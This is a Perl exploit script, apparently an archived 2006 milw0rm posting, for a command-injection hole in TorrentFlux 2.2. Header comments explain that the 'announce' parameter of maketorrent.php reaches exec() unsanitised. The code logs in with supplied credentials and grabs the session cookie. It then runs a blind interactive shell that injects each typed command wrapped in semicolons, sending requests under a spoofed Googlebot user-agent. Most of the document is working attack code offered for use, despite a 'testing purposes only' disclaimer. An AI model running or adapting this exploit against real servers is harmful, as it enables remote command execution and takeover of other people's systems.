# The variable announce in maketorrent.php is not sanitised before being used. The announce 
# variable goes through various stages throughout the script, then it is passed as a into
# an exec() function. This occurs in the middle of the string which is passed to the exec()
# function. Therefore it is possible to stop the current stop by starting with ; then by
# ending your command with ; (to avoid the other data TorrentFlux adds after the announce variable). 
# No data is returned to the user when they use this exploit, so it is hard to tell if the script
# is vulnerable, and the use of htmlspecialchars() tends to make things much hard since 
# chracters like < and > dont work. 

# r0ut3r (writ3r [at] gmail.com)

#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                         TorrentFlux 2.2 Command Execution Exploit                             #
#################################################################################################
# Software: TorrentFlux 2.2                                                                     #
#                                                                                               #
# Vendor: http://www.torrentflux.com/                                                           #
#                                                                                               #
# Released: 2006/12/09                                                                          #
#                                                                                               #
# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #
#                                                                                               #
# Note from a developer: "Valid TorrentFlux user IDs are REQUIRED and this is NOT an open       #
# vulnerability to a NON user".                                                                 #
#                                                                                               #
# Note: The information provided in this document is for TorrentFlux administrator              #
# testing purposes only! This vulnerability requires a user account. And watch out              #
# for htmlspecialchars() when sending commands since tf uses it to sanitise variables.          #
#                                                                                               #
# Apart from a few problems (which are fixed) TorrentFlux is a great torrent client.            #
# Download it at: http://www.torrentflux.com/                                                   #
#################################################################################################

use IO::Socket;

$port = "80"; # connection port
$target = @ARGV[0]; # torrentflux.com
$folder = @ARGV[1]; # /torrentflux/
$user = @ARGV[2]; # login username
$pass = @ARGV[3]; # login password

sub Header()
{
	print q
	{#################################################################################################
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                  writ3r [at] gmail.com                                        #
#                                                                                               #
#                         TorrentFlux 2.2 Command Execution Exploit                             #
#################################################################################################
};
}

sub Usage()
{
	print q
	{
Usage: tf2exec.pl [target] [directory] [username] [password]
Example: tf2exec.pl torrentflux.com /torrentflux/ r0ut3r testing123 
};
	exit();
}

Header();

if (!$target || !$folder || !$user || !$pass) {
	Usage(); }

#Thanks to cb88 for the login request... 
print "\n[+] Connecting...\r\n";
$sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
print "[+] Attempting to login\n";
print $sock "GET ".$folder."login.php?username=$user&iamhim=$pass HTTP/1.1\n";
print $sock "Host: $target\n";
print $sock "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
print $sock "Accept: text/html\n";
print $sock "Connection: keep-alive\n\n\r\n";

while (<$sock>)
{
        if (/Cookie: TorrentFlux=(.*?);/)
        {
                $cookie = "TorrentFlux=$1";
        }
}

print "[+] Successfully logged in\n";
print "[+] Cookie: ".$cookie."\n";
if ($cookie eq "")
{
        print "[-] Failed to login. Exiting...";
	exit();
}

print "[+] Starting shell\n";
print "[cmd]\$ ";
$cmd = <STDIN>;
$cmd =~ s/ /%20/g;
while ($cmd !~ "exit")
{
	$xpack = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
	print $xpack "GET ".$folder."maketorrent.php?announce=;".substr($cmd, 0, -1)."; HTTP/1.1\n";
	print $xpack "Host: $target\n";
	print $xpack "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
	print $xpack "Accept: text/html\n";
	print $xpack "Cookie: ".$cookie."\n";
	print $xpack "Connection: keep-alive\n\n";

	print "[cmd]\$ ";
	$cmd = <STDIN>;
}

print "[!] Connection to host lost...\n";

#################################################################################################
#               This has been another r0ut3r discovery - writ3r [at] gmail.com                  #
#################################################################################################

# milw0rm.com [2006-12-09]